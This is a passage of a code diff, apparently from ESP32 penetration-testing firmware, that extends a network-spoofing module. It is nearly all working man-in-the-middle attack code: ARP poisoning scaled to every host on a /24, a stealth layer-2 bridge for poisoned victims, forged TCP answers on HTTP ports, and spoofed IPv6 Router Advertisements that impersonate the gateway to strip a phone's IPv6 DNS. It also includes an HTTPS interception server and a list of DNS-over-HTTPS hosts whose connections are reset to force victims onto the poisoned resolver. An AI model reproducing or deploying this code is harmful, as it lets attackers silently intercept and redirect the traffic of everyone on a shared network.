@@ -25,6 +25,7 @@
  */
 
 #include "net_spoof.h"
+#include "net_spoof_cert.h"
 
 #include "core/wifi/wifi_common.h"
 #include "modules/wifi/wifi_atks.h"
@@ -32,6 +33,7 @@
 #include <globals.h>
 
 #include <WiFi.h>
+#include <esp_https_server.h>
 #include <esp_netif.h>
 #include <esp_netif_net_stack.h>
 #include <esp_system.h>
@@ -40,7 +42,9 @@
 #include <lwip/etharp.h>
 #include <lwip/inet.h>
 #include <lwip/netif.h>
+#include <lwip/sockets.h>
 #include <lwip/tcpip.h>
+#include <mbedtls/platform.h>
 
 #include <freertos/FreeRTOS.h>
 #include <freertos/semphr.h>
@@ -76,10 +80,48 @@ struct NetSpoofPair {
     uint32_t since;
 };
 
-static NetSpoofTarget s_targets[NETSPOOF_MAX_TARGETS];
-static int s_targetCount = 0;
+// --- target / pair storage -------------------------------------------------
+// These were fixed arrays in .bss, sized for a handful of hosts. "All devices"
+// on a /24 means ~200 pairs, and at 24 B per pair plus 48 B per target that is
+// ~17 KB of INTERNAL DRAM - the memory the Wi-Fi/BLE bring-up and the MITM page
+// itself have to fit into. Allocate both tables from PSRAM on first use, with a
+// small internal fallback so a denied allocation degrades instead of crashing.
+// Neither accessor is called from the layer-2 hook.
+static NetSpoofTarget *s_targetsMem = nullptr;
+static int s_targetsCap = 0;
+static NetSpoofTarget s_targetsFallback[16];
+static NetSpoofTarget *s_targets() {
+    if (s_targetsMem) return s_targetsMem;
+    size_t bytes = sizeof(NetSpoofTarget) * NETSPOOF_MAX_TARGETS;
+    s_targetsMem = (NetSpoofTarget *)heap_caps_calloc(1, bytes, MALLOC_CAP_SPIRAM);
+    if (!s_targetsMem) s_targetsMem = (NetSpoofTarget *)heap_caps_calloc(1, bytes, MALLOC_CAP_8BIT);
+    if (s_targetsMem) {
+        s_targetsCap = NETSPOOF_MAX_TARGETS;
+        return s_targetsMem;
+    }
+    s_targetsCap = 16;
+    Serial.println("[NETSPOOF] target table: no PSRAM, 16-slot fallback");
+    return s_targetsFallback;
+}
 
-static NetSpoofPair s_pairs[NETSPOOF_MAX_PAIRS];
+static NetSpoofPair *s_pairsMem = nullptr;
+static int s_pairsCap = 0;
+static NetSpoofPair s_pairsFallback[8];
+static NetSpoofPair *s_pairs() {
+    if (s_pairsMem) return s_pairsMem;
+    size_t bytes = sizeof(NetSpoofPair) * NETSPOOF_MAX_PAIRS;
+    s_pairsMem = (NetSpoofPair *)heap_caps_calloc(1, bytes, MALLOC_CAP_SPIRAM);
+    if (!s_pairsMem) s_pairsMem = (NetSpoofPair *)heap_caps_calloc(1, bytes, MALLOC_CAP_8BIT);
+    if (s_pairsMem) {
+        s_pairsCap = NETSPOOF_MAX_PAIRS;
+        return s_pairsMem;
+    }
+    s_pairsCap = 8;
+    Serial.println("[NETSPOOF] pair table: no PSRAM, 8-slot fallback");
+    return s_pairsFallback;
+}
+
+static int s_targetCount = 0;
 static int s_pairCount = 0;
 static uint32_t s_arpFrames = 0;
 static uint32_t s_arpSince = 0;
@@ -93,11 +135,20 @@ static int s_injectCount = 0;
 
 static bool s_dnsActive = false;
 static bool s_httpActive = false;
+static bool s_httpsActive = false;
+// True when the HTTPS endpoint started the DNS responder itself (there were no
+// user rules); stopping HTTPS can then stop it again. If DNS was already up, it
+// keeps running with the user's rules after HTTPS stops.
+static bool s_httpsOwnsDns = false;
+static httpd_handle_t s_httpsServer = NULL;
 static uint32_t s_dnsQueries = 0;
 static uint32_t s_dnsAnswers = 0;
 static uint32_t s_httpRequests = 0;
 static uint32_t s_httpRedirected = 0;
 static uint32_t s_httpInjected = 0;
+static uint32_t s_httpsRequests = 0;
+static uint32_t s_httpsRedirected = 0;
+static uint32_t s_httpsInjected = 0;
 
 // The capture ring is scratch data (the last eight intercepted frames) and used
 // to sit in .bss: eight entries of ~530 B = 4.2 KB of INTERNAL DRAM for the
@@ -114,7 +165,8 @@ static NetSpoofCapture *s_captures() {
     }
     return s_captureRing;
 }
-static int s_captureCount = 0; // valid entries, newest at index 0
+static int s_captureCount = 0;      // valid entries, newest at index 0
+static uint32_t s_captureTotal = 0; // monotonic; never wraps in practice
 
 static NetSpoofSlot s_slots[NETSPOOF_QUEUE_DEPTH];
 static portMUX_TYPE s_slotMux = portMUX_INITIALIZER_UNLOCKED;
@@ -128,6 +180,109 @@ static struct netif *s_hookedNetif = NULL;
 
 static uint8_t s_myMac[6] = {0};
 static uint8_t s_bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+
+// --- transparent forwarding ------------------------------------------------
+// With the ARP poison up, every frame a victim sends to its "gateway" arrives
+// here. Forwarding puts those frames back on the air toward the real gateway
+// (and the replies back toward the victim) with the MACs rewritten, which is
+// the only way a poisoned client can keep a working internet path: the ESP has
+// no NAT/router, so without a bridge a redirected client can never load the
+// page it was sent to. That is what turned "redirect to the video" into a dead
+// end before (the video host resolved to this board, which cannot fetch it).
+static bool s_forwardActive = false;
+static uint32_t s_fwdFrames = 0;
+static uint32_t s_fwdBytes = 0;
+static uint32_t s_fwdDropped = 0;
+static uint8_t s_gwMac[6] = {0};
+static bool s_gwMacOk = false;
+
+/// Victim IP -> MAC, learned from the frames that pass through.
+///
+/// A reply from the gateway carries the victim's IP but is addressed to this
+/// board's MAC (the gateway's ARP entry for the victim is poisoned), so the
+/// destination MAC has to be looked up by IP, not by the frame header.
+/// 256 slots in PSRAM, indexed by the last octet of the address: every host on
+/// a /24 lands in its own slot, so a lookup is one array read instead of the
+/// linear scan the 16-entry table needed - and 16 entries could not hold a
+/// 200-victim run at all (replies would have been forwarded to the wrong MAC).
+#define NETSPOOF_FWD_PEERS 256
+struct NetSpoofPeer {
+    uint32_t ip;
+    uint8_t mac[6];
+    uint16_t _pad;
+};
+static NetSpoofPeer *s_fwdPeerMem = nullptr;
+static portMUX_TYPE s_fwdMux = portMUX_INITIALIZER_UNLOCKED;
+
+/// Called from the control task (start / scan), never from the receive path.
+static NetSpoofPeer *s_fwdPeersEnsure() {
+    if (s_fwdPeerMem) return s_fwdPeerMem;
+    size_t bytes = sizeof(NetSpoofPeer) * NETSPOOF_FWD_PEERS;
+    s_fwdPeerMem = (NetSpoofPeer *)heap_caps_calloc(1, bytes, MALLOC_CAP_SPIRAM);
+    if (!s_fwdPeerMem) s_fwdPeerMem = (NetSpoofPeer *)heap_caps_calloc(1, bytes, MALLOC_CAP_8BIT);
+    return s_fwdPeerMem;
+}
+
+static void _fwdPeersClear() {
+    NetSpoofPeer *peers = s_fwdPeersEnsure();
+    if (!peers) return;
+    portENTER_CRITICAL(&s_fwdMux);
+    memset(peers, 0, sizeof(NetSpoofPeer) * NETSPOOF_FWD_PEERS);
+    portEXIT_CRITICAL(&s_fwdMux);
+}
+
+/// Flows whose TCP handshake this board passed straight through to the server.
+///
+/// Intercepting only the data segment of a bridged flow splits the connection
+/// between two TCP stacks: the SYN-ACK the client holds came from the real
+/// server, so the sequence numbers of the forged answer do not match and the
+/// client sits there until it times out - which is exactly what a real phone did
+/// against this engine (a bridged SYN, then an answered HTTP request, then
+/// 10 s of nothing). Once a handshake is bridged the rest of that flow is
+/// bridged too.
+#define NETSPOOF_FLOW_MAX 64
+struct NetSpoofFlow {
+    uint32_t srcIp;
+    uint32_t dstIp;
+    uint16_t sport;
+    uint16_t dport;
+    uint32_t ts;
+};
+static NetSpoofFlow s_flows[NETSPOOF_FLOW_MAX];
+static portMUX_TYPE s_flowMux = portMUX_INITIALIZER_UNLOCKED;
+
+static int _flowSlot(uint32_t srcIp, uint32_t dstIp, uint16_t sport, uint16_t dport) {
+    uint32_t h = srcIp ^ (dstIp << 1) ^ ((uint32_t)sport << 16) ^ dport;
+    return (int)(h & (NETSPOOF_FLOW_MAX - 1));
+}
+
+static void _flowMark(uint32_t srcIp, uint32_t dstIp, uint16_t sport, uint16_t dport) {
+    int i = _flowSlot(srcIp, dstIp, sport, dport);
+    portENTER_CRITICAL(&s_flowMux);
+    s_flows[i].srcIp = srcIp;
+    s_flows[i].dstIp = dstIp;
+    s_flows[i].sport = sport;
+    s_flows[i].dport = dport;
+    s_flows[i].ts = millis();
+    portEXIT_CRITICAL(&s_flowMux);
+}
+
+static bool _flowBridged(uint32_t srcIp, uint32_t dstIp, uint16_t sport, uint16_t dport) {
+    int i = _flowSlot(srcIp, dstIp, sport, dport);
+    bool hit = false;
+    portENTER_CRITICAL(&s_flowMux);
+    if (s_flows[i].srcIp == srcIp && s_flows[i].dstIp == dstIp && s_flows[i].sport == sport &&
+        s_flows[i].dport == dport && (millis() - s_flows[i].ts) < 120000)
+        hit = true;
+    portEXIT_CRITICAL(&s_flowMux);
+    return hit;
+}
+
+/// Hosts a redirect points at: they must keep resolving for real, or every
+/// redirect to a name would resolve back to this board and loop forever.
+#define NETSPOOF_DNS_PASS_MAX 4
+static String s_passHosts[NETSPOOF_DNS_PASS_MAX];
+static int s_passCount = 0;
 
 /// Frames built in these buffers; internal RAM so they stay DMA-capable.
 static uint8_t s_txFrame[NETSPOOF_FRAME_MAX + 16];
@@ -205,6 +360,36 @@ static uint32_t _rd32(const uint8_t *p) {
 // ===========================================================================
 // 2. Ethernet frame transmit
 // ===========================================================================
+
+// ---------------------------------------------------------------------------
+// mbedtls allocator: the TLS handshake needs ~32 KB of record buffers, and the
+// prebuilt mbedtls in this Arduino build calls plain calloc() (internal RAM)
+// because CONFIG_MBEDTLS_EXTERNAL_MEM_ALLOC is off. With the Wi-Fi driver up
+// there is not enough internal RAM for that, so mbedtls_ssl_setup() fails with
+// ESP_ERR_MBEDTLS_SSL_SETUP_FAILED and every HTTPS connection is reset. Prefer
+// PSRAM for large mbedtls blocks and keep small ones internal; free() works for
+// both. This is a throwaway server, so the slower PSRAM path is irrelevant.
+static void *_nsMbedtlsCalloc(size_t n, size_t size) {
+    if (n == 0 || size == 0) return NULL;
+    size_t total = n * size;
+    if (total / n != size) return NULL;
+    void *p = NULL;
+    if (total >= 1024) p = heap_caps_calloc(1, total, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
+    if (p == NULL) p = heap_caps_calloc(1, total, MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
+    return p;
+}
+
+static void _nsMbedtlsFree(void *p) {
+    if (p) heap_caps_free(p);
+}
+
+static bool s_mbedtlsAllocSet = false;
+
+static void _ensureMbedtlsPsram() {
+    if (s_mbedtlsAllocSet) return;
+    s_mbedtlsAllocSet = true;
+    mbedtls_platform_set_calloc_free(_nsMbedtlsCalloc, _nsMbedtlsFree);
+}
 
 static bool _tx(const uint8_t *frame, size_t len) {
     if (len < 14 || len > NETSPOOF_FRAME_MAX) return false;
@@ -399,6 +584,7 @@ int netspoof_scan_targets(uint32_t timeoutMs, String &err) {
     if (maxHosts < 8) maxHosts = 8;
 
     s_targetCount = 0;
+    NetSpoofTarget *tgt = s_targets();
     int tableCount = 0;
     uint32_t sent = 0;
     uint32_t start = millis();
@@ -427,20 +613,20 @@ int netspoof_scan_targets(uint32_t timeoutMs, String &err) {
                 struct netif *foundNetif = NULL;
                 if (!etharp_get_entry(i, &foundIp, &foundNetif, &foundMac)) continue;
                 if (!foundIp || !foundMac) continue;
-                if (s_targetCount >= NETSPOOF_MAX_TARGETS) break;
+                if (s_targetCount >= s_targetsCap) break;
                 if (_isZeroMac(foundMac->addr)) continue;
 
                 IPAddress hostIp((uint32_t)foundIp->addr);
                 bool dup = false;
                 for (int d = 0; d < s_targetCount; d++) {
-                    if (s_targets[d].ip == hostIp) {
+                    if (tgt[d].ip == hostIp) {
                         dup = true;
                         break;
                     }
                 }
                 if (dup) continue;
 
-                NetSpoofTarget &t = s_targets[s_targetCount++];
+                NetSpoofTarget &t = tgt[s_targetCount++];
                 t.ip = hostIp;
                 memcpy(t.mac, foundMac->addr, 6);
                 t.macStr = _macStr(t.mac);
@@ -462,12 +648,12 @@ int netspoof_scan_targets(uint32_t timeoutMs, String &err) {
     // explicitly so getTargets() always shows the interesting host.
     bool haveGw = false;
     for (int i = 0; i < s_targetCount; i++)
-        if (s_targets[i].gateway) haveGw = true;
-    if (!haveGw && s_targetCount < NETSPOOF_MAX_TARGETS) {
+        if (tgt[i].gateway) haveGw = true;
+    if (!haveGw && s_targetCount < s_targetsCap) {
         uint8_t gmac[6];
         if (gwMacOk || netspoof_resolve_mac(gwIp, gmac, 1500)) {
             if (!gwMacOk) memcpy(gwMac, gmac, 6);
-            NetSpoofTarget &t = s_targets[s_targetCount++];
+            NetSpoofTarget &t = tgt[s_targetCount++];
             t.ip = gwIp;
             memcpy(t.mac, gwMac, 6);
             t.macStr = _macStr(gwMac);
@@ -491,7 +677,7 @@ int netspoof_target_count() { return s_targetCount; }
 
 const NetSpoofTarget *netspoof_target(int idx) {
     if (idx < 0 || idx >= s_targetCount) return NULL;
-    return &s_targets[idx];
+    return &s_targets()[idx];
 }
 
 void netspoof_clear_targets() { s_targetCount = 0; }
@@ -500,12 +686,28 @@ void netspoof_clear_targets() { s_targetCount = 0; }
 // 4. ARP spoof pairs + service task
 // ===========================================================================
 
-static void _pairsSnapshot(NetSpoofPair *out, int *count, int max) {
+static int _pairCountNow() {
     _lock();
-    int n = s_pairCount < max ? s_pairCount : max;
-    for (int i = 0; i < n; i++) out[i] = s_pairs[i];
-    *count = n;
+    int n = s_pairCount;
     _unlock();
+    return n;
+}
+
+/// Copy one pair out under the lock.
+///
+/// The service task used to snapshot the whole table into a local array, which
+/// was fine for 8 pairs but needs 4.8 KB of stack for 200 - more than the 4 KB
+/// service task stack. One entry at a time keeps the stack flat at any size.
+static bool _pairCopy(int idx, NetSpoofPair *out) {
+    if (!out) return false;
+    _lock();
+    if (idx < 0 || idx >= s_pairCount) {
+        _unlock();
+        return false;
+    }
+    *out = s_pairs()[idx];
+    _unlock();
+    return true;
 }
 
 static void _poisonPair(const NetSpoofPair &p, int burst) {
@@ -534,6 +736,33 @@ static void _restorePair(const NetSpoofPair &p) {
         _sendArp(s_bcast, p.targetMac, tIp, s_bcast, gIp, ARP_OP_REQUEST, 2);
         vTaskDelay(pdMS_TO_TICKS(5));
     }
+}
+
+/// The gateway's LAN MAC: the address that actually answers ARP for it.
+///
+/// `netspoof_gateway_info()` prefers the LwIP ARP table and then falls back to
+/// the AP's BSSID, and on a real router those are two different addresses (a
+/// measured 2026-10-23 network: LAN `20:35:43:fe:45:03`, radio
+/// `20:35:43:fe:45:04`). Poisoning the radio address never reaches the router's
+/// LAN side, so the gateway->victim direction is not intercepted and replies
+/// bypass the bridge. Ask ARP for the LAN address first and only fall back.
+static bool _resolveGatewayMac(const IPAddress &gw, uint8_t mac[6]) {
+    // Cached per gateway address: netspoof_resolve_mac() flushes the ARP table,
+    // so doing it for every one of 200 targets would cost a 1.5 s poll each.
+    static uint32_t cachedIp = 0;
+    static uint8_t cachedMac[6] = {0};
+    if (cachedIp == (uint32_t)gw) {
+        memcpy(mac, cachedMac, 6);
+        return true;
+    }
+    uint8_t m[6] = {0};
+    IPAddress gwCopy = gw;
+    if (!netspoof_resolve_mac(gw, m, 1500) && !netspoof_gateway_info(gwCopy, m)) return false;
+    if (_isZeroMac(m)) return false;
+    memcpy(mac, m, 6);
+    cachedIp = (uint32_t)gw;
+    memcpy(cachedMac, m, 6);
+    return true;
 }
 
 /// The default gateway: the caller's address when given, otherwise DHCP's.
@@ -569,35 +798,41 @@ static bool _pairAdd(
     }
 
     _ensure_mutex();
+    NetSpoofPair *pr = s_pairs();
     _lock();
     // Refresh an existing pair instead of adding a duplicate.
     for (int i = 0; i < s_pairCount; i++) {
-        if (s_pairs[i].target == target) {
-            s_pairs[i].gateway = gw;
-            memcpy(s_pairs[i].targetMac, tMac, 6);
-            memcpy(s_pairs[i].gatewayMac, gMac, 6);
-            NetSpoofPair copy = s_pairs[i];
+        if (pr[i].target == target) {
+            pr[i].gateway = gw;
+            memcpy(pr[i].targetMac, tMac, 6);
+            memcpy(pr[i].gatewayMac, gMac, 6);
+            NetSpoofPair copy = pr[i];
             _unlock();
             _poisonPair(copy, 5);
             return true;
         }
     }
-    if (s_pairCount >= NETSPOOF_MAX_PAIRS) {
+    if (s_pairCount >= s_pairsCap) {
+        int cap = s_pairsCap;
         _unlock();
-        err = "too many active ARP pairs (max " + String(NETSPOOF_MAX_PAIRS) + ")";
+        err = "too many active ARP pairs (max " + String(cap) + ")";
         return false;
     }
-    NetSpoofPair &p = s_pairs[s_pairCount++];
+    NetSpoofPair &p = pr[s_pairCount++];
     p.target = target;
     p.gateway = gw;
     memcpy(p.targetMac, tMac, 6);
     memcpy(p.gatewayMac, gMac, 6);
     p.since = millis();
     NetSpoofPair copy = p;
+    int active = s_pairCount;
     _unlock();
 
     if (s_arpSince == 0) s_arpSince = millis();
-    _poisonPair(copy, 5);
+    // A larger burst makes the first poison stick, but 200 pairs x 5 rounds is
+    // 2000 frames in one go: above a couple of dozen pairs two rounds are
+    // enough, because the periodic re-poison pass keeps them fresh anyway.
+    _poisonPair(copy, active > 32 ? 2 : 5);
     Serial.printf(
         "[NETSPOOF] arp pair: %s (%s) <-> %s (%s)\n",
         target.toString().c_str(),
@@ -628,7 +863,7 @@ bool netspoof_arp_start(const IPAddress &target, const IPAddress &gateway, Strin
         err = "target did not answer ARP (wrong subnet or host down)";
         return false;
     }
-    if (!netspoof_gateway_info(gw, gMac)) {
+    if (!_resolveGatewayMac(gw, gMac)) {
         err = "could not resolve the gateway MAC (gateway not in the ARP table)";
         return false;
     }
@@ -666,7 +901,7 @@ bool netspoof_arp_start_mac(
     }
 
     uint8_t gMac[6] = {0};
-    if (!netspoof_gateway_info(gw, gMac)) {
+    if (!_resolveGatewayMac(gw, gMac)) {
         err = "could not resolve the gateway MAC (gateway not in the ARP table)";
         return false;
     }
@@ -674,10 +909,11 @@ bool netspoof_arp_start_mac(
 }
 
 void netspoof_arp_restore_all() {
-    NetSpoofPair snapshot[NETSPOOF_MAX_PAIRS];
-    int n = 0;
-    _pairsSnapshot(snapshot, &n, NETSPOOF_MAX_PAIRS);
-    for (int i = 0; i < n; i++) _restorePair(snapshot[i]);
+    int n = _pairCountNow();
+    for (int i = 0; i < n; i++) {
+        NetSpoofPair p;
+        if (_pairCopy(i, &p)) _restorePair(p);
+    }
 
     _lock();
     s_pairCount = 0;
@@ -686,14 +922,15 @@ void netspoof_arp_restore_all() {
 }
 
 bool netspoof_arp_stop(String &err) {
-    NetSpoofPair snapshot[NETSPOOF_MAX_PAIRS];
-    int n = 0;
-    _pairsSnapshot(snapshot, &n, NETSPOOF_MAX_PAIRS);
+    int n = _pairCountNow();
     if (n == 0) {
         err = "no ARP spoofing is running";
         return false;
     }
-    for (int i = 0; i < n; i++) _restorePair(snapshot[i]);
+    for (int i = 0; i < n; i++) {
+        NetSpoofPair p;
+        if (_pairCopy(i, &p)) _restorePair(p);
+    }
 
     _lock();
     s_pairCount = 0;
@@ -734,10 +971,10 @@ bool netspoof_arp_pair_info(
         _unlock();
         return false;
     }
-    target = s_pairs[idx].target;
-    gateway = s_pairs[idx].gateway;
-    String tm = _macStr(s_pairs[idx].targetMac);
-    String gm = _macStr(s_pairs[idx].gatewayMac);
+    target = s_pairs()[idx].target;
+    gateway = s_pairs()[idx].gateway;
+    String tm = _macStr(s_pairs()[idx].targetMac);
+    String gm = _macStr(s_pairs()[idx].gatewayMac);
     _unlock();
     if (targetMac) strncpy(targetMac, tm.c_str(), 17);
     if (gatewayMac) strncpy(gatewayMac, gm.c_str(), 17);
@@ -747,7 +984,7 @@ bool netspoof_arp_pair_info(
 bool netspoof_arp_pair_index(const IPAddress &ip, int *idx) {
     _lock();
     for (int i = 0; i < s_pairCount; i++) {
-        if (s_pairs[i].target == ip) {
+        if (s_pairs()[i].target == ip) {
             if (idx) *idx = i;
             _unlock();
             return true;
@@ -839,6 +1076,121 @@ static bool _dnsQuestion(
 }
 
 /**
+ * @brief True when a TCP payload starts with an HTTP request line.
+ *
+ * Covers every method a web server normally sees, so the interceptor no longer
+ * depends on the destination port and catches admin panels, dev servers and
+ * alternate HTTP ports (8000, 8888, 3000, ...).
+ */
+// Wire trace for debugging the forged TCP path. Off in normal builds: it prints
+// one line per intercepted segment and would swamp the console at 115200 baud.
+#define NETSPOOF_TRACE 0
+
+/// Ports where a plaintext HTTP request is the expected first payload.
+///
+/// While forwarding is on, a handshake on one of these is answered by this
+/// board instead of being bridged: that is what makes "open any website and get
+/// the page" work without depending on the device's DNS (a phone with IPv6 DNS,
+/// a cached answer or a hard-coded resolver would otherwise go straight to the
+/// real server). Every other port is bridged untouched, so nothing that is not
+/// plaintext HTTP can be broken by the interception.
+static bool _plainHttpPort(uint16_t port) {
+    return port == 80 || port == 8080 || port == 8000 || port == 8888 || port == 3000 || port == 5000 ||
+           port == 9000;
+}
+
+static bool _looksHttp(const char *txt, uint16_t len) {
+    if (len < 4) return false;
+    return memcmp(txt, "GET ", 4) == 0 || memcmp(txt, "POST", 4) == 0 ||
+           memcmp(txt, "HEAD", 4) == 0 || memcmp(txt, "PUT ", 4) == 0 ||
+           memcmp(txt, "DELE", 4) == 0 || memcmp(txt, "OPTI", 4) == 0 ||
+           memcmp(txt, "PATC", 4) == 0 || memcmp(txt, "TRAC", 4) == 0 ||
+           memcmp(txt, "CONN", 4) == 0;
+}
+
+// --- bridge helpers -------------------------------------------------------
+
+/// Remember IP -> MAC for a host whose traffic passes through this board.
+/// Called from the layer-2 hook (both cores), so the table is guarded by a
+/// critical section rather than the engine mutex (which must never be taken
+/// from the receive path).
+static void _fwdLearn(uint32_t ip, const uint8_t *mac) {
+    if (ip == 0 || _isZeroMac(mac)) return;
+    NetSpoofPeer *peers = s_fwdPeerMem; // never allocate from the receive path
+    if (!peers) return;
+    portENTER_CRITICAL(&s_fwdMux);
+    NetSpoofPeer &p = peers[ip & (NETSPOOF_FWD_PEERS - 1)];
+    p.ip = ip;
+    memcpy(p.mac, mac, 6);
+    portEXIT_CRITICAL(&s_fwdMux);
+}
+
+static bool _fwdPeerMac(uint32_t ip, uint8_t *mac) {
+    NetSpoofPeer *peers = s_fwdPeerMem;
+    if (!peers) return false;
+    bool found = false;
+    portENTER_CRITICAL(&s_fwdMux);
+    NetSpoofPeer &p = peers[ip & (NETSPOOF_FWD_PEERS - 1)];
+    if (p.ip == ip) {
+        memcpy(mac, p.mac, 6);
+        found = true;
+    }
+    portEXIT_CRITICAL(&s_fwdMux);
+    return found;
+}
+
+/// Put one received frame back on the air with rewritten MACs.
+///
+/// The IP packet is left untouched (no NAT, no TTL change): this is a layer-2
+/// bridge, so the gateway sees exactly the frame the victim sent and the reply
+/// the victim expects. Called from the receive path, no allocation.
+static bool _fwdForward(uint8_t *frame, uint16_t len, const uint8_t *dst, const uint8_t *src) {
+    if (len < 14) return false;
+    memcpy(frame, dst, 6);
+    memcpy(frame + 6, src, 6);
+    bool ok = _tx(frame, len);
+    if (ok) {
+        s_fwdFrames++;
+        s_fwdBytes += len;
+    } else {
+        s_fwdDropped++;
+    }
+    return ok;
+}
+
+/**
+ * @brief Bridge one frame between a poisoned client and the real gateway.
+ *
+ * Only frames addressed to this board's MAC are considered - the ARP poison is
+ * what makes them arrive here - and only real unicast destinations: broadcast
+ * and multicast traffic already reached everyone and must never be re-sent (a
+ * forwarded broadcast is a storm), and anything addressed to the board's own IP
+ * belongs to the local stack, not the bridge.
+ *
+ * Direction is decided by the learned table: a frame for an IP we have seen as
+ * a client goes back to that client (gateway -> victim), everything else goes
+ * to the gateway (victim -> internet).
+ *
+ * @return true when the frame was re-sent and must not reach lwIP
+ */
+static bool _bridgeFrame(uint8_t *frame, uint16_t len, uint32_t srcIp, uint32_t dstIp) {
+    if (!s_forwardActive) return false;
+    uint32_t myIp = (uint32_t)WiFi.localIP();
+    if (myIp == 0) return false;
+    if (!_sameMac(frame, s_myMac)) return false; // not addressed to us
+    if (dstIp == myIp) return false;             // local stack / interception
+    uint8_t dst0 = frame[14 + 16];               // IPv4 destination, first octet
+    if (dst0 == 0xFF || (dst0 & 0xF0) == 0xE0) return false; // broadcast/multicast
+
+    uint8_t vmac[6];
+    if (_fwdPeerMac(dstIp, vmac)) return _fwdForward(frame, len, vmac, s_myMac);
+
+    _fwdLearn(srcIp, frame + 6);
+    if (!s_gwMacOk) return false;
+    return _fwdForward(frame, len, s_gwMac, s_myMac);
+}
+
+/**
  * @brief Inspect one received frame and queue anything worth answering.
  *
  * Runs on the WiFi receive path, so it only reads the headers, copies a bounded
@@ -846,6 +1198,144 @@ static bool _dnsQuestion(
  * straight on to the previously installed input handler, which keeps normal
  * station traffic (DHCP, our own TCP) working.
  */
+/// EUI-64 link-local address for a MAC (fe80::<mac with ff:fe inserted>).
+static void _linkLocalFromMac(const uint8_t *mac, uint8_t out[16]) {
+    memset(out, 0, 16);
+    out[0] = 0xFE;
+    out[1] = 0x80;
+    out[8] = (uint8_t)(mac[0] ^ 0x02);
+    out[9] = mac[1];
+    out[10] = mac[2];
+    out[11] = 0xFF;
+    out[12] = 0xFE;
+    out[13] = mac[3];
+    out[14] = mac[4];
+    out[15] = mac[5];
+}
+
+/// One Router Advertisement: 16-byte RA header + one 24-byte RDNSS option.
+#define NETSPOOF_RA_LEN 40
+/// Whole ethernet frame carrying it (14 eth + 40 IPv6 + NETSPOOF_RA_LEN).
+#define NETSPOOF_RA_FRAME (14 + 40 + NETSPOOF_RA_LEN)
+
+/**
+ * @brief Build a Router Advertisement that retires the gateway's IPv6 service.
+ *
+ * A modern phone prefers IPv6 whenever the network offers it, and on a
+ * dual-stack AP that is the whole attack gone: Android sends its DNS to the
+ * router's link-local address (advertised with RDNSS, RFC 8106), those packets
+ * never touch the IPv4 ARP poison, and every name resolves for real - so
+ * `https://github.com` simply loads and no redirect rule ever fires. Measured
+ * on the 2026-10-23 test network: the gateway advertises
+ * `fe80::2235:43ff:fefe:4503` and a global /64, and a phone on it resolved over
+ * IPv6 while the engine saw `dns=0/0`.
+ *
+ * The fix is the standard "go away" advertisement a captive portal sends, and
+ * it has to carry **both** halves:
+ *   - router lifetime 0 (bytes 6..7) removes the gateway from the client's
+ *     default router list, so new flows have no IPv6 path and fall back to IPv4;
+ *   - an RDNSS option (type 25) with **lifetime 0** naming that same link-local
+ *     address removes the DNS server itself (RFC 8106 section 5.1), which is
+ *     what actually makes the client resolve over IPv4 again. Without it the
+ *     phone keeps the IPv6 resolver for the full advertised lifetime (minutes)
+ *     and the interception stays invisible.
+ *
+ * The RA is unicast (only the poisoned client sees it) with the gateway's own
+ * link-local as the source, so the client accepts it as coming from its router.
+ * It is repeated while the attack runs because the real router re-advertises
+ * every few minutes. A network whose client gets its IPv6 resolver from
+ * stateful DHCPv6 instead of RDNSS cannot be retired this way.
+ *
+ * @return frame length, or 0 when @p cap is too small
+ */
+static uint16_t _buildRaRetire(uint8_t *frame, size_t cap, const uint8_t *dstMac, const uint8_t *gwMac) {
+    if (!frame || !dstMac || !gwMac) return 0;
+    if (cap < NETSPOOF_RA_FRAME) return 0;
+    size_t total = NETSPOOF_RA_FRAME;
+    memset(frame, 0, total);
+    memcpy(frame, dstMac, 6);
+    memcpy(frame + 6, s_myMac, 6);
+    frame[12] = 0x86;
+    frame[13] = 0xDD;
+
+    uint8_t src[16], dst[16];
+    _linkLocalFromMac(gwMac, src);
+    _linkLocalFromMac(dstMac, dst);
+
+    uint8_t *ip6 = frame + 14;
+    ip6[0] = 0x60;
+    ip6[5] = (uint8_t)(NETSPOOF_RA_LEN & 0xFF); // ICMPv6 payload length
+    ip6[6] = 58;                                // next header: ICMPv6
+    ip6[7] = 255;                               // hop limit for ND
+    memcpy(ip6 + 8, src, 16);
+    memcpy(ip6 + 24, dst, 16);
+
+    uint8_t *ra = ip6 + 40;
+    ra[0] = 134;  // Router Advertisement
+    ra[4] = 64;   // current hop limit
+    // ra[5] = 0   (flags: not managed, no other-config - nothing to renew)
+    // ra[6..7] = 0 -> router lifetime 0: "not a default router anymore"
+
+    // RDNSS option (RFC 8106): type 25, length 3 (24 bytes), lifetime 0, and
+    // the server address the client must forget.
+    uint8_t *rdnss = ra + 16;
+    rdnss[0] = 25;
+    rdnss[1] = 3;
+    // rdnss[2..3] reserved, rdnss[4..7] lifetime 0
+    memcpy(rdnss + 8, src, 16);
+
+    // ICMPv6 checksum over the IPv6 pseudo-header + the whole ICMPv6 message.
+    uint32_t acc = 0;
+    acc = _sum16(src, 16, acc);
+    acc = _sum16(dst, 16, acc);
+    acc += NETSPOOF_RA_LEN; // upper-layer packet length
+    acc += 58;              // next header
+    acc = _sum16(ra, NETSPOOF_RA_LEN, acc);
+    _put16(ra + 2, _finish16(acc));
+
+    return (uint16_t)total;
+}
+
+/// Send the retire-RA above to one poisoned client.
+static bool _sendRaRetire(const uint8_t *dstMac, const uint8_t *gwMac) {
+    uint8_t frame[NETSPOOF_RA_FRAME];
+    uint16_t len = _buildRaRetire(frame, sizeof(frame), dstMac, gwMac);
+    if (!len) return false;
+    return _tx(frame, len);
+}
+
+/// True when a TLS ClientHello names a DNS-over-HTTPS endpoint.
+///
+/// While traffic is bridged a DoH connection would simply succeed, and the
+/// browser would resolve everything itself without ever asking this engine.
+/// These flows are reset on purpose so the browser falls back to the system
+/// resolver - the same thing a captive portal does. The SNI is cleartext in the
+/// ClientHello, so a bounded case-insensitive scan is enough.
+static bool _tlsLooksLikeDoh(const uint8_t *data, uint16_t len) {
+    static const char *kMarkers[] = {
+        "cloudflare-dns.com", "dns.google", "nextdns.io", "doh.opendns.com",
+        "dns.quad9.net",     "dns.adguard",  "dns.mullvad.net", "dns.alidns.com",
+        "doh.pub",           "dns.pub",      "doh.360.cn",      "dns.google.com",
+    };
+    if (!data || len < 8) return false;
+    for (size_t m = 0; m < sizeof(kMarkers) / sizeof(kMarkers[0]); m++) {
